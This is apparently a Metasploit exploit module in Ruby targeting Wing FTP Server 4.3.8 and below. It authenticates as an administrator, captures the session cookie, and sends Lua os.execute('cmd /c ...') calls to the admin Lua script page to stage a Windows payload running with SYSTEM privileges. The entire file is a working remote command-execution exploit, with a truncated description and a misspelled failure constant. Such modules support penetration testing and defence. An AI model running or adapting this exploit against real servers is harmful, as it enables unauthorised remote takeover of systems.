# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Wing FTP Server Authenticated Command Execution&#039;,
      &#039;Description&#039;    => %q{
        versions 4.3.8 and below. When supplying a specially crafted HTTP POST request
        an attacker can use os.execute() to execute arbitrary system commands on
        the target with SYSTEM privileges.
      },
      &#039;Author&#039;         =>
        [
          &#039;Nicholas Nam <nick[at]executionflow.org>&#039;
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://www.wftpserver.com&#039; ]
        ],
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows VBS Stager&#039;, {} ]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Jun 19 2014&#039;,
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
      [
        Opt::RPORT(5466),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;Admin username&#039;, &#039;&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;Admin password&#039;, &#039;&#039;])
      ], self.class
    )
    deregister_options(&#039;CMDSTAGER::FLAVOR&#039;)
  end

  def check
    res = send_request_cgi(
      {
        &#039;uri&#039;     =>  &#039;/admin_login.html&#039;,
        &#039;method&#039;  => &#039;GET&#039;
      })

    if !res
      fail_with(Failure::Unreachable, "#{peer} - Admin login page was unreachable.")
    elsif res.code != 200
      fail_with(Failure::NotFound, "#{peer} - Admin login page was not found.")
    elsif res.body =~ /Wing FTP Server Administrator/ && res.body =~ /2003-2014 <b>wftpserver.com<\/b>/
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    username = datastore[&#039;USERNAME&#039;]
    password = datastore[&#039;PASSWORD&#039;]
    @session_cookie = authenticate(username, password)

    print_status("#{peer} - Sending payload")
    # Execute the cmdstager, max length of the commands is ~1500
    execute_cmdstager(flavor: :vbs, linemax: 1500)
  end

  def execute_command(cmd, _opts = {})
    command = "os.execute(&#039;cmd /c #{cmd}&#039;)"

    res = send_request_cgi(
      &#039;uri&#039;       => &#039;/admin_lua_script.html&#039;,
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;cookie&#039;    => @session_cookie,
      &#039;vars_post&#039; => { &#039;command&#039; => command }
    )

    if res && res.code != 200
      fail_with(Failure::Unkown, "#{peer} - Something went wrong.")
    end
  end

  def authenticate(username, password)
    print_status("#{peer} - Authenticating")
    res = send_request_cgi(
      &#039;uri&#039;       => &#039;/admin_loginok.html&#039;,
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;vars_post&#039; => {
        &#039;username&#039;     => username,
        &#039;password&#039;     => password,
        &#039;username_val&#039; => username,
        &#039;password_val&#039; => password,
        &#039;submit_btn&#039;   => &#039;+Login+&#039;
      }
    )

    uidadmin = &#039;&#039;
    if !res
      fail_with(Failure::Unreachable, "#{peer} - Admin login page was unreachable.")
    elsif res.code == 200 && res.body =~ /location=&#039;main.html\?lang=english&#039;;/
      res.get_cookies.split(&#039;;&#039;).each do |cookie|
        cookie.split(&#039;,&#039;).each do |value|
          uidadmin = value.split(&#039;=&#039;)[1] if value.split(&#039;=&#039;)[0] =~ /UIDADMIN/
        end
      end
    else
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    end

    "UIDADMIN=#{uidadmin}"
  end
end

